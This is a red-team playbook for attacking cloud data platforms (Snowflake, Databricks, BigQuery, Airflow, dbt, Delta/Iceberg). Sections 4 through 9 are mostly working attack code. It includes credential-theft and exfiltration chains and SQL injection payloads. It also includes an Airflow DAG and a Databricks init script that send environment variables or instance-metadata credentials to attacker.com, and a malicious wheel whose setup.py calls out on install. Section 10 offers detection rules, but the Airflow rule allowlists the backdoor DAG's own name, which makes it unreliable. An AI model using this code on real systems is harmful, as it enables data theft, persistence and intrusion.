# Data Platform Attack Playbook

> A practitioner's end-to-end playbook for executing red-team engagements against modern cloud data platforms — Snowflake, Databricks, BigQuery, Redshift, dbt, and Airflow. Designed for authorized security testing only.

## Table of Contents

1. [Engagement Scoping](#1-engagement-scoping)
2. [Lab Setup](#2-lab-setup)
3. [Reconnaissance Methodology](#3-reconnaissance-methodology)
4. [Identity Abuse Workflow](#4-identity-abuse-workflow)
5. [SQL Injection at Warehouse Scale](#5-sql-injection-at-warehouse-scale)
6. [Pipeline Exploitation (dbt + Airflow)](#6-pipeline-exploitation-dbt--airflow)
7. [Notebook & Compute RCE](#7-notebook--compute-rce)
8. [Lakehouse Delta/Iceberg/Hudi Attacks](#8-lakehouse-deltaiceberghudi-attacks)
9. [Cross-Tenant Exfiltration](#9-cross-tenant-exfiltration)
10. [Detection Engineering for Blue Teams](#10-detection-engineering-for-blue-teams)
11. [Reporting Templates](#11-reporting-templates)
12. [Reference Material](#12-reference-material)

---

## 1. Engagement Scoping

### 1.1 In-Scope Platforms (typical)

| Platform | Common scenarios | Typical engagement window |
|---|---|---|
| Snowflake | Identity abuse, exfil via external stage, network policy bypass | 5 days |
| Databricks | PAT leak simulation, notebook RCE, secret scope abuse | 3-5 days |
| BigQuery | Authorized dataset chain, remote function RCE | 3 days |
| Redshift | IAM chaining, snapshot exfil | 2-3 days |
| dbt Cloud | CI/CD token theft, manifest recon | 2 days |
| Airflow | Metadata DB exposure, DAG backdoor | 3 days |
| Lakehouse (Delta/Iceberg) | Log tampering | 2 days |

### 1.2 Authorization Checklist

- [ ] Signed rules of engagement (ROE) naming each platform
- [ ] Written permission to access cloud accounts / projects
- [ ] Authorized source IP ranges
- [ ] Named point of contact for each platform team
- [ ] Data classification scope (e.g., "PII columns only — exclude PCI")
- [ ] Exfiltration limits (e.g., "≤10 rows per table")
- [ ] Engagement windows (e.g., "Mon-Fri 09:00-17:00 ET")
- [ ] Incident response protocol if production impact detected
- [ ] Post-engagement data destruction attestation

### 1.3 Out-of-Scope (typical)

- Production customer data reads (use synthetic data sets)
- Denial-of-service (no compute resource exhaustion)
- Cryptographic attack on customer-side encrypted data
- Modification of customer-owned buckets / shares
- Cross-customer impact via shared infrastructure

### 1.4 Success Criteria

- Demonstrate at least one full breach chain per platform
- Provide detection rules (Sigma / Splunk SPL / KQL) for each chain
- Deliver actionable remediation per platform team
- All evidence (sessions, screenshots, audit logs) packaged for the post-engagement report

---

## 2. Lab Setup

### 2.1 Snowflake Trial Account

```bash
# Sign up: https://signup.snowflake.com/
# Note: trial accounts expire in 30 days; use for engagement rehearsal only

# Configure snowsql
pip install snowflake-connector-python
brew install snowflake-investments/snowcli/snowsql  # macOS
# Or download from https://snowsql.com/

# Configure connection profile (~/.snowsql/config)
[connections.engagement_lab]
accountname = REPLACE_WITH_YOUR_ACCT
username = REPLACE_WITH_YOUR_USER
authenticator = externalbrowser
rolename = ACCOUNTADMIN
```

### 2.2 Databricks Community Edition

```bash
# Sign up: https://community.databricks.com/
# Community Edition provides a single-node cluster for testing
# For full workspace testing, use a 14-day Databricks trial

# Install databricks-cli
pip install databricks-cli
databricks configure --token
# Host: https://<your-workspace>.cloud.databricks.com
# Token: REPLACE_WITH_YOUR_PAT
```

### 2.3 BigQuery Sandbox (free)

```bash
# Enable BigQuery sandbox: https://cloud.google.com/bigquery/docs/sandbox
gcloud auth login
gcloud config set project REPLACE_WITH_YOUR_PROJECT

# Verify sandbox active
bq ls --project_id REPLACE_WITH_YOUR_PROJECT
```

### 2.4 Airflow Standalone

```bash
# Local Airflow for testing
pip install apache-airflow
airflow standalone

# Webserver: http://localhost:8080
# Username: admin
# Password: <printed on first run>
```

### 2.5 dbt Cloud Trial

```bash
# 14-day trial: https://www.getdbt.com/
# After signup, get DBT_CLOUD_API_TOKEN from Account Settings → API

pip install dbt-core dbt-snowflake dbt-bigquery
dbt init engagement_lab
```

### 2.6 Target Practice Data

For each platform, set up synthetic data:
- `pii.users` — synthetic SSNs, emails, phones (Faker library)
- `sales.orders` — 1M synthetic transactions
- `logs.events` — 10M synthetic events

```python
from faker import Faker
import pandas as pd

fake = Faker()
users = pd.DataFrame([{
    'id': i,
    'name': fake.name(),
    'email': fake.email(),
    'phone': fake.phone_number(),
    'ssn': fake.ssn(),
} for i in range(10000)])
users.to_csv('users.csv', index=False)
```

---

## 3. Reconnaissance Methodology

### 3.1 OSINT — External Account Discovery

**Goal**: Identify all data platform URLs the target organization uses.

```bash
# GitHub dorks (use gh CLI for authenticated higher rate limits)
gh search code "snowflake_account" --owner target
gh search code "DATABRICKS_TOKEN" --owner target
gh search code "DBT_CLOUD_API_TOKEN" --owner target
gh search code "airflow_connection" --owner target
gh search code "bigquery_service_account" --owner target

# Public SSO portal discovery
curl -sI https://acme.okta.com/.well-known/openid-configuration
curl -sI https://login.microsoftonline.com/<tenant_id>/v2.0/.well-known/openid-configuration
```

### 3.2 Snowflake Account Enumeration

```bash
# Generate candidates from common org patterns
for prefix in "" "-prod" "-dev" "-staging" "-ent" "-bi" "-data" "-corpdwh"; do
  for acct in acme acmecorp acme-inc acme_data acmedata acmecorporation; do
    candidate="${acct}${prefix}"
    code=$(curl -s -o /dev/null -w "%{http_code}" "https://${candidate}.snowflakecomputing.com/oauth/authorize")
    [ "$code" = "302" ] && echo "[+] Found: ${candidate} (302)"
  done
done
```

### 3.3 SAML IdP Confirmation

Once a candidate account is identified:
```bash
# Inspect redirect URL
curl -sI "https://acme-prod.snowflakecomputing.com/oauth/authorize" | grep -i location

# Response: Location: https://acme.okta.com/home/snowflake/...
# Confirms: account exists, SAML IdP is Okta, integration name visible
```

### 3.4 Databricks Workspace Discovery

```bash
# Three cloud patterns
# AWS:    https://<workspace>.cloud.databricks.com
# Azure:  https://adb-<digits>.<random>.<region>.databricks.azure.net
# GCP:    https://<workspace>.gcp.databricks.com

# Probe via DNS
for ws in acme-prod acme-staging acme-data acme-ml; do
  host "${ws}.cloud.databricks.com"
  host "${ws}.gcp.databricks.com"
done

# Confirm via web UI fingerprint
curl -s "https://acme-prod.cloud.databricks.com/login.html" | grep -oP '<title>[^<]+</title>'
```

### 3.5 BigQuery Project Discovery

```bash
# Public dataset shadows
for proj in acme-prod acme-analytics acme-data acme-bi; do
  bq ls --project_id=$proj 2>/dev/null | head -1 && echo "[+] Project accessible: $proj"
done

# gcloud project discovery (requires auth)
gcloud projects list --filter="name~acme" --format="value(projectId)"
```

### 3.6 Airflow Recon

```bash
# Webserver banner
curl -s https://airflow.target/login/ | grep -oP 'Airflow v[\d.]+'

# Health endpoint (often unauthenticated)
curl -s https://airflow.target/health | jq

# API endpoints (default: basic auth with admin/admin)
curl -u admin:admin https://airflow.target/api/v1/dagRuns
```

### 3.7 dbt Cloud Recon

```bash
# dbt Cloud account ID often in Slack notifications
# Search Slack for: "dbt Cloud" OR "Run started"
# Extract account ID from URL: https://cloud.getdbt.com/accounts/<ACCT_ID>/

# Once you have account ID, probe public endpoints
curl -s "https://cloud.getdbt.com/api/v2/accounts/REPLACE_WITH_YOUR_ACCT_ID/" \
  -H "Authorization: Token REPLACE_WITH_YOUR_TOKEN"
```

---

## 4. Identity Abuse Workflow

### 4.1 Snowflake — UNC5537 Pattern

The 2024 Snowflake breaches attributed to UNC5537 followed a consistent pattern:

1. **Credential acquisition**: Purchase phished creds from access brokers (Snowflake user + password)
2. **Account discovery**: Identify Snowflake account via SSO portal enumeration
3. **Authentication**: Direct SSO login (no MFA on target account)
4. **Role enumeration**: `SHOW ROLES;` to identify granted roles
5. **Privilege escalation**: Use `ACCOUNTADMIN` if SCIM mis-mapped
6. **Data discovery**: `SHOW DATABASES;` → identify `prod_db`
7. **Exfiltration**: `COPY INTO @external_stage FROM prod_db.pii.customers;`
8. **Persistence**: Create a new service account or backdoor SAML integration
9. **Cover tracks**: Set `QUERY_TAG` to common periodic job tag

```bash
# Simulated UNC5537 chain in lab
export SNOWFLAKE_ACCOUNT="acme-prod"
export SNOWFLAKE_USER="phished_engagement_user"

snowsql -a $SNOWFLAKE_ACCOUNT -u $SNOWFLAKE_USER \
  --authenticator=externalbrowser \
  -q "
    SHOW ROLES;
    SHOW GRANTS TO USER;
    USE ROLE ACCOUNTADMIN;
    SHOW DATABASES;
    CREATE STAGE exfil_stage URL='s3://REPLACE-WITH-ENGAGEMENT-BUCKET/exfil/';
    COPY INTO @exfil_stage/users.csv FROM prod_db.pii.users;
  "
```

### 4.2 Databricks — PAT Chain

```bash
# Step 1: Token acquisition (CI log leak)
export DATABRICKS_HOST="https://acme-prod.cloud.databricks.com"
export DATABRICKS_TOKEN="REPLACE_WITH_YOUR_PAT"

# Step 2: Validate
curl -s -H "Authorization: Bearer $DATABRICKS_TOKEN" \
  "$DATABRICKS_HOST/api/2.0/token-management/current"

# Step 3: Workspace enumeration
databricks workspace list /

# Step 4: Cluster recon (look for instance profile ARN)
databricks clusters list --output JSON | jq '.[].aws_attributes.instance_profile_arn'

# Step 5: Secret scope enumeration
databricks secrets list-scopes
databricks secrets list --scope REPLACE_WITH_YOUR_SCOPE

# Step 6: Notebook RCE for IMDS
# (In a notebook %python cell)
import subprocess
print(subprocess.check_output([
    'curl', '-s',
    'http://169.254.169.254/latest/meta-data/iam/security-credentials/'
]).decode())

# Step 7: Use stolen AWS creds
export AWS_ACCESS_KEY_ID=REPLACE_WITH_YOUR_AKI
export AWS_SECRET_ACCESS_KEY=REPLACE_WITH_YOUR_SK
export AWS_SESSION_TOKEN=REPLACE_WITH_YOUR_TOKEN
aws s3 ls s3://prod-customer-data/
```

### 4.3 BigQuery — SA Key Chain

```bash
# Step 1: SA key from leaked JSON
gcloud auth activate-service-account --key-file=./sa.json

# Step 2: Project enumeration
gcloud projects list

# Step 3: Permission enumeration
python3 enumerate_iam.py --service-account ./sa.json

# Step 4: Dataset enumeration
bq ls --project_id=acme-prod

# Step 5: PII discovery via INFORMATION_SCHEMA
bq query --use_legacy_sql=false "
SELECT table_schema, table_name, column_name
FROM \`region-us\`.INFORMATION_SCHEMA.COLUMNS
WHERE column_name LIKE '%email%' OR column_name LIKE '%ssn%'
LIMIT 100
"

# Step 6: Exfil via EXPORT DATA
bq query --use_legacy_sql=false "
EXPORT DATA OPTIONS(uri='gs://attacker-bucket/exfil/*.csv', format='CSV') AS
SELECT * FROM \`acme-prod.pii.users\`
"
```

---

## 5. SQL Injection at Warehouse Scale

### 5.1 Identifying Injection Points

Modern BI dashboards (Tableau, Looker, ThoughtSpot, Mode, Hex) often concatenate filter values directly into warehouse queries. Look for:

- Filter parameters in URL: `?region=US&date=2024-01-01`
- Date selectors that pass through as strings
- Dimension values from user-controlled dropdowns
- Embedded analytics with no parameterization

### 5.2 Snowflake SQLi via Filter

```sql
-- Vulnerable app code:
-- SELECT * FROM sales WHERE region = '{region}'

-- Inject:
region=US' UNION SELECT name, email, NULL FROM snowflake.account_usage.users --
```

### 5.3 BigQuery SQLi with EXCEPT

```sql
-- BigQuery supports EXCEPT and INTERSECT
-- Vulnerable app code:
-- SELECT * FROM sales WHERE region = '{region}'

-- Inject:
region=US'
UNION ALL
SELECT 'admin' AS region, email AS sales, NULL AS date
FROM `acme-prod.pii.users`
LIMIT 100 --
```

### 5.4 Warehouse SQLi for Recon

Once SQLi confirmed, dump warehouse internals:
```sql
-- Snowflake
' UNION SELECT name, created_on, NULL FROM snowflake.account_usage.users --
' UNION SELECT catalog, schema_name, table_name FROM snowflake.information_schema.tables --

-- BigQuery
' UNION SELECT table_schema, table_name, NULL FROM `region-us`.INFORMATION_SCHEMA.TABLES --

-- Redshift (Postgres-flavored)
' UNION SELECT schemaname, tablename, NULL FROM pg_catalog.pg_tables --
```

### 5.5 Exfil via UNION + COPY

```sql
-- Combine SQLi with COPY in a stored proc:
' UNION CALL admin.run_dynamic('COPY INTO @attacker_stage FROM pii.users') --
```

---

## 6. Pipeline Exploitation (dbt + Airflow)

### 6.1 dbt CI/CD Token Theft

**Common leak vectors:**
- GitHub Actions default log redaction misses `echo $DBT_CLOUD_API_TOKEN`
- Slack notifications include job ID but not token — unless user posts debugging
- `.dbt/profiles.yml` committed accidentally to dev branches
- VSCode extensions logging environment to telemetry

**Exploitation:**
```bash
export DBT_CLOUD_API_TOKEN="REPLACE_WITH_YOUR_TOKEN"
export DBT_CLOUD_ACCOUNT_ID="REPLACE_WITH_YOUR_ACCT_ID"

# List projects
curl -H "Authorization: Token $DBT_CLOUD_API_TOKEN" \
  "https://cloud.getdbt.com/api/v2/accounts/$DBT_CLOUD_ACCOUNT_ID/projects/"

# Download latest manifest
RUN_ID=$(curl -s -H "Authorization: Token $DBT_CLOUD_API_TOKEN" \
  "https://cloud.getdbt.com/api/v2/accounts/$DBT_CLOUD_ACCOUNT_ID/runs/?order_by=-id&per_page=1" \
  | jq -r '.results[0].id')

curl -H "Authorization: Token $DBT_CLOUD_API_TOKEN" \
  "https://cloud.getdbt.com/api/v2/accounts/$DBT_CLOUD_ACCOUNT_ID/runs/$RUN_ID/artifacts/manifest.json" \
  -o manifest.json

# Extract source nodes (databases the project touches)
jq '.sources | to_entries[] | {db: .value.database, schema: .value.schema, name: .value.name}' manifest.json
```

### 6.2 Airflow Metadata DB

```bash
# Direct DB access
psql "host=rds-host.cluster-x.rds.amazonaws.com \
      port=5432 dbname=airflow user=airflow password=REPLACE_WITH_YOUR_PW"

# Dump connections
\copy (SELECT conn_id, conn_type, host, login, password, extra FROM connection) TO '/tmp/conns.csv' CSV HEADER;

# Recover FERNET_KEY
echo $AIRFLOW__CORE__FERNET_KEY
# Or from config
grep fernet_key /etc/airflow/airflow.cfg

# Decrypt offline
python3 - <<'PY'
from cryptography.fernet import Fernet
f = Fernet(b'REPLACE_WITH_YOUR_FERNET_KEY')
enc = b'gAAAAAB...'  # paste connection.password value
print(f.decrypt(enc).decode())
PY
```

### 6.3 DAG Code Injection

If you have write access to the DAG repo:

```python
# attacker_dag.py
from airflow import DAG
from airflow.operators.python import PythonOperator
from datetime import datetime
import os, json, urllib.request

def _persist():
    env = dict(os.environ)
    data = json.dumps(env).encode()
    req = urllib.request.Request(
        'https://attacker.com/collect',
        data=data,
        headers={'Content-Type': 'application/json'}
    )
    urllib.request.urlopen(req)

with DAG('data_quality_helper',
         start_date=datetime(2024, 1, 1),
         schedule_interval='@hourly',
         catchup=False) as dag:
    PythonOperator(task_id='check', python_callable=_persist)
```

Once committed, the scheduler picks it up within a minute (default `dag_dir_list_interval=300`).

### 6.4 Airflow Variables Backdoor

```python
from airflow.models import Variable
Variable.set("aws_access_key", "REPLACE_WITH_YOUR_AKI")
Variable.set("aws_secret_key", "REPLACE_WITH_YOUR_SK")
```

These persist in metadata DB; any operator can read them via `Variable.get()`.

---

## 7. Notebook & Compute RCE

### 7.1 Databricks %python / %scala / %sh Cells

The four notebook cell types that allow code execution:

```python
%python
# Direct shell access via os/subprocess
import subprocess
print(subprocess.check_output('id', shell=True).decode())
print(subprocess.check_output(
    ['curl', '-s', 'http://169.254.169.254/latest/meta-data/']
).decode())
```

```scala
%scala
import scala.sys.process._
val creds = "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/".!!
println(creds)
```

```bash
%sh
# Shell directly in the executor container
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

```r
%r
system("curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/")
```

### 7.2 Cluster Init Script RCE

```bash
# Build init script
cat > ./evil_init.sh <<'EOF'
#!/bin/bash
# Background C2 callback with IMDS data
(
  IMDS=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
  curl -s -X POST -d "$IMDS" https://attacker.com/c2
) &
EOF

# Upload to DBFS
dbfs cp evil_init.sh dbfs:/init/evil.sh

# Create cluster
databricks clusters create --json '{
  "cluster_name": "shared-test",
  "spark_version": "13.3.x-scala2.12",
  "node_type_id": "i3.xlarge",
  "num_workers": 1,
  "init_scripts": [{"dbfs": {"destination": "dbfs:/init/evil.sh"}}]
}'
```

### 7.3 Malicious Library (.whl / .jar)

```bash
# Build a malicious wheel
mkdir payload && cd payload
cat > setup.py <<'EOF'
from setuptools import setup
import os, urllib.request
urllib.request.urlopen(
    urllib.request.Request(
        'https://attacker.com/ping',
        data=os.environ.get('PATH', '').encode()
    )
)
setup(name='payload', version='0.0.1', py_modules=['payload'])
EOF

python setup.py bdist_wheel
# Upload + install on cluster
dbfs cp dist/payload-0.0.1-py3-none-any.whl dbfs:/libraries/
curl -X POST -H "Authorization: Bearer $DATABRICKS_TOKEN" \
  "$DATABRICKS_HOST/api/2.0/libraries/install" \
  -d '{"cluster_id":"REPLACE_WITH_YOUR_CLUSTER","libraries":[{"whl":"dbfs:/libraries/payload-0.0.1-py3-none-any.whl"}]}'
```

### 7.4 Synapse Spark Pool IMDS

```python
%pyspark
import requests
r = requests.get(
    'http://169.254.169.254/metadata/identity/oauth2?api-version=2018-02-01&resource=https://storage.azure.com/',
    headers={'Metadata': 'true'}
)
print(r.json()['access_token'])
# This token is valid for Azure Storage reads across subscription
```

### 7.5 Spark Livy REST API

```bash
# Livy exposed without auth on port 8998
# Step 1: Start session
curl -X POST -H "Content-Type: application/json" \
  http://target:8998/sessions \
  -d '{"kind": "pyspark"}'

# Step 2: Submit code
curl -X POST http://target:8998/sessions/0/statements \
  -H "Content-Type: application/json" \
  -d '{"code": "import os\nos.popen(\"id\").read()"}'

# Step 3: Read output
curl http://target:8998/sessions/0/statements/0
```

---

## 8. Lakehouse Delta/Iceberg/Hudi Attacks

### 8.1 Delta Log Structure

```bash
# Delta table at S3 path s3://bucket/path/
s3://bucket/path/
├── _delta_log/
│   ├── 00000000000000000000.json     # initial commit
│   ├── 00000000000000000001.json     # 2nd commit
│   ├── ...
│   ├── 00000000000000000040.checkpoint.parquet  # checkpoint
│   └── _last_checkpoint              # pointer to latest
├── part-00000-abc.c000.snappy.parquet
├── part-00000-def.c000.snappy.parquet
└── ...
```

### 8.2 Append a Tampered Commit

```python
import boto3
import json

s3 = boto3.client('s3')

# Read latest version
last = s3.get_object(
    Bucket='REPLACE_WITH_YOUR_BUCKET',
    Key='path/_delta_log/_last_checkpoint'
)
version = json.loads(last['Body'].read())['version']

# Build a malicious next commit
# Remove the "victim" parquet and add attacker data
next_version = f'{version + 1:020d}'
commit = {
    "remove": {"path": "part-00000-victim.c000.snappy.parquet", "deletionTimestamp": 1700000000000},
    "add": {"path": "part-00000-attacker.c000.snappy.parquet", "size": 1234, "modificationTime": 1700000000000, "dataChange": True}
}

s3.put_object(
    Bucket='REPLACE_WITH_YOUR_BUCKET',
    Key=f'path/_delta_log/{next_version}.json',
    Body=json.dumps(commit).encode()
)
```

### 8.3 Iceberg Catalog Tamper

```python
# Iceberg uses Hive metastore or Glue or REST catalog
# Each table has metadata/metadata.json with snapshots
# Tampering: append a snapshot pointing to attacker data files

# Glue catalog example
import boto3
glue = boto3.client('glue')
table = glue.get_table(DatabaseName='analytics', Name='customers')
# Modify table.properties to point to attacker metadata location
```

### 8.4 Hudi Timeline

```bash
# Hudi timeline at .hoodie/
# Each commit: <timestamp>.commit, <timestamp>.deltacommit, <timestamp>.replacecommit
# Tampering: append a .replacecommit to atomically swap data files

# Steps:
# 1. Read latest commit timestamp
# 2. Construct a malicious .replacecommit file
# 3. Upload via compromised SA
aws s3 cp ./evil.replacecommit s3://bucket/path/.hoodie/
```

---

## 9. Cross-Tenant Exfiltration

### 9.1 Snowflake Secure Data Sharing

```sql
-- On victim account (requires ACCOUNTADMIN)
CREATE SHARE to_attacker;
GRANT USAGE ON DATABASE prod_db TO SHARE to_attacker;
GRANT USAGE ON SCHEMA prod_db.pii TO SHARE to_attacker;
GRANT SELECT ON TABLE prod_db.pii.customers TO SHARE to_attacker;
ALTER SHARE to_attacker ADD ACCOUNTS = 'REPLACE_WITH_ATTACKER_ACCT_ID';

-- On attacker account
CREATE DATABASE stolen FROM SHARE REPLACE_WITH_VICTIM_ACCT_ID.to_attacker;
SELECT * FROM stolen.pii.customers LIMIT 1000;
```

### 9.2 BigQuery Authorized Dataset

```bash
# Add attacker project to authorized list on victim dataset
bq update --source=schema.json acme-prod:pii

# schema.json:
{
  "access": [
    {"project": {"projectId": "attacker-proj", "datasetId": "exfil"}}
  ]
}

# From attacker project, query the dataset
bq query --use_legacy_sql=false \
  'SELECT * FROM `acme-prod.pii.customers` LIMIT 1000'
```

### 9.3 Redshift Snapshot Share

```bash
aws redshift modify-snapshot-copy-assignment \
  --snapshot-identifier acme-snap \
  --target-aws-account REPLACE_WITH_ATTACKER_ACCT
```

### 9.4 Databricks Marketplace

```bash
# Publish a malicious dataset to Databricks Marketplace
# When victims attach, your notebook gets cloned to their workspace
# (Requires Marketplace provider account)
```

---

## 10. Detection Engineering for Blue Teams

For each attack pattern, deliver a detection rule to the blue team.

### 10.1 Snowflake — Sigma Rule for Exfil

```yaml
title: Snowflake COPY INTO External Stage
id: 7e3f9c2a-...
status: experimental
description: Detects COPY INTO from sensitive schema to external stage
logsource:
  product: snowflake
  service: account_usage.query_history
detection:
  selection:
    QUERY_TEXT|contains: "COPY INTO @"
    DATABASE_NAME|contains:
      - "PII"
      - "PCI"
      - "CUSTOMERS"
  condition: selection
level: high
```

### 10.2 Snowflake — Splunk SPL

```spl
index=snowflake sourcetype=snowflake:query_history
  QUERY_TEXT="*COPY INTO*@*"
  DATABASE_NAME="*PII*" OR DATABASE_NAME="*PCI*"
| stats count by USER_NAME, QUERY_TEXT, QUERY_TAG
| where count > 1 OR QUERY_TAG != "nightly_refresh"
```

### 10.3 Snowflake — KQL (Microsoft Sentinel)

```kusto
Snowflake
| where QueryText has "COPY INTO @" and (DatabaseName has "PII" or DatabaseName has "PCI")
| summarize count() by UserName, QueryText, QueryTag
| where count_ > 1 or QueryTag != "nightly_refresh"
```

### 10.4 Databricks — IMDS Access Detection

```kusto
DatabricksClusterLogs
| where Message has "169.254.169.254"
| summarize count() by ClusterId, NotebookPath, UserEmail
```

### 10.5 BigQuery — EXPORT DATA Detection

```kusto
GCP_Audit_Logs
| where methodName == "google.cloud.bigquery.v2.JobService.InsertJob"
| where protoPayload.requestData.jobConfig.query.query has "EXPORT DATA"
| summarize count() by protoPayload.authenticationInfo.principalEmail, resourceName
```

### 10.6 Airflow — DAG Diff Detection

```yaml
title: Airflow DAG Definition Changed
id: 4f9a8c1b-...
logsource:
  product: airflow
  service: scheduler
detection:
  selection:
    message|contains: "DagBag loaded"
  filter_allowed:
    dag_id:
      - "data_quality_helper"
      - "hourly_ingest"
      - "nightly_refresh"
  condition: selection and not filter_allowed
level: medium
```

### 10.7 dbt Cloud — Token Use Outside CI

```kusto
dbtCloudAuditLogs
| where eventType == "api_token_used"
| where not(ipAddress startswith "10." or ipAddress startswith "172.")
| summarize count() by user, tokenName, ipAddress
```

### 10.8 Universal — Service Account Anomaly

```kusto
let knownLocations = pack_array("US-East", "US-West", "EU-West");
AuditLogs
| where Identity has "svc_" or Identity has "service-account"
| where Location !in (knownLocations)
| summarize count() by Identity, Location, bin(TimeGenerated, 1h)
```

---

## 11. Reporting Templates

### 11.1 Per-Finding Template

```markdown
## Finding X: <Title>

**Severity**: CRITICAL / HIGH / MEDIUM / LOW
**Platform**: Snowflake / Databricks / BigQuery / Redshift / dbt / Airflow
**Target**: <REDACTED identifier>
**Window**: YYYY-MM-DD HH:MM UTC

### Description
<1-2 paragraph technical summary>

### Attack Chain
1. <step 1>
2. <step 2>
3. <step 3>

### Evidence
- Snowflake session ID: <REDACTED>
- Screenshot: <path in evidence dir>
- Audit log excerpt: <REDACTED>

### Impact
- <rows exposed>
- <data classifications affected>
- <lateral movement possible>

### Remediation
1. <short-term>
2. <medium-term>
3. <long-term>

### Detection Rule
<sigma/spl/kql query — see Section 10>

### References
- MITRE ATT&CK: <technique>
- Mandiant UNC5537 report
- Vendor advisory: <URL>
```

### 11.2 Executive Summary Template

```markdown
## Executive Summary

Between <START> and <END>, the red team executed an authorized assessment of
<TARGET>'s cloud data platform security posture. The assessment covered
<platforms> and identified <N> critical findings, <M> high findings, and <P>
medium findings.

### Key Findings

1. **Snowflake MFA gap** — <percent>% of users lacked MFA, enabling UNC5537-style
   breach
2. **Databricks PAT leak** — <N> tokens found in public GitHub repos
3. **Airflow metadata DB exposure** — Connections table reachable from dev VLAN

### Business Impact

- **Customer data**: <X> records across <Y> tables potentially exfiltrated in
  test scenarios
- **Compliance**: <GDPR/HIPAA/SOC2> implications require <Z>-day notification
- **Financial**: Estimated $<amount> exposure based on <data classification>

### Recommendations

1. **Identity hardening** — enforce phishing-resistant MFA on all data platform
   users within 30 days
2. **Secret rotation** — rotate all Airflow connections and Databricks PATs
3. **Network policy review** — apply per-user network policies on Snowflake
4. **Detection engineering** — implement the 8 detection rules in Section 10

### Strategic Direction

<2-3 paragraph strategic context — e.g., "current posture suggests identity-based
perimeter is incomplete; recommend investment in CIEM (Cloud Infrastructure
Entitlement Management) tooling">
```

### 11.3 Technical Appendix

- Full finding details
- Detection rule source code
- Evidence package (hash-attested)
- Raw audit log exports ( sanitized)
- Engagement timeline with timestamps

---

## 12. Reference Material

### 12.1 Key Incidents (2023-2024)

| Incident | Date | Pattern |
|---|---|---|
| Snowflake / UNC5537 | 2024-04 to 2024-06 | Identity-based breach via phished creds, no MFA |
| Snowflake / Ticketmaster | 2024-05 | Subset of UNC5537 campaign |
| Snowflake / AT&T | 2024-07 | Subset of UNC5537 campaign |
| Snowflake / Santander | 2024-05 | Subset of UNC5537 campaign |
| Databricks Marketplace typosquat | 2023-12 | Fake dataset with malicious notebook |
| Airflow CVE-2024-39205 (deprecated) | 2024 | DagBag deserialization |
| dbt Cloud CI artifact leak | 2024-02 | Public S3 bucket with manifests |

### 12.2 Vendor Documentation

- **Snowflake**: https://docs.snowflake.com/
- **Databricks**: https://docs.databricks.com/
- **BigQuery**: https://cloud.google.com/bigquery/docs/
- **Redshift**: https://docs.aws.amazon.com/redshift/
- **dbt Cloud**: https://docs.getdbt.com/
- **Apache Airflow**: https://airflow.apache.org/docs/

### 12.3 Security References

- **Mandiant UNC5537 Report** — https://cloud.google.com/blog/topics/threat-intelligence/unc5537-snowflake-data-theft-extortion
- **Snowflake Threat Notices** — https://community.snowflake.com/s/security-advisories
- **MITRE ATT&CK Cloud Matrix** — https://attack.mitre.org/matrices/enterprise/cloud/
- **OWASP Cloud-Native Application Security Top 10** — https://owasp.org/www-project-cloud-native-application-security-top-10/

### 12.4 Academic / Industry Research

- *Detection of Credential Abuse in Snowflake* — SANS Institute (2024)
- *Cloud Lakehouse Security Patterns* — Databricks Industry Whitepaper (2024)
- *Beyond the Perimeter: Identity-Based Attacks on Cloud Data Warehouses* — Black Hat USA (2024)

### 12.5 Tooling References

| Tool | Purpose | License |
|---|---|---|
| snowsql | Snowflake CLI | Snowflake proprietary, free |
| databricks-cli | Databricks workspace admin | Apache 2.0 |
| bq | BigQuery CLI | Google proprietary, free |
| aws-cli | AWS / Redshift | Apache 2.0 |
| dbt-core | dbt framework | Apache 2.0 |
| airflow-cli | Apache Airflow | Apache 2.0 |
| enumerate-iam | IAM permission brute force | MIT |
| pacu | AWS exploitation framework | BSD |
| faker | Synthetic data generation | MIT |

### 12.6 Glossary

- **Accountadmin** — Snowflake's highest role, controls the entire account
- **Account Usage** — Snowflake's shared schema for account-level metadata
- **Authorized Dataset / View** — BigQuery feature allowing a dataset/view to read another dataset without explicit grants
- **Checkpoint** — Delta Lake periodic snapshot of the log
- **DAG** — Directed Acyclic Graph, Airflow's representation of a pipeline
- **External Stage** — Snowflake pointer to external storage (S3, GCS, Azure Blob)
- **FERNET_KEY** — Airflow symmetric key for encrypting secrets in metadata DB
- **GetClusterCredentials** — Redshift IAM action that returns temp DB creds
- **IMDS** — Instance Metadata Service (AWS EC2 metadata endpoint at 169.254.169.254)
- **PAT** — Personal Access Token (Databricks)
- **Resource Monitor** — Snowflake's quota on credits consumed
- **SCIM** — System for Cross-domain Identity Management, used for SSO provisioning
- **Secure Data Sharing** — Snowflake feature for cross-account data sharing without copying data
- **Workgroup** — Redshift Serverless compute unit
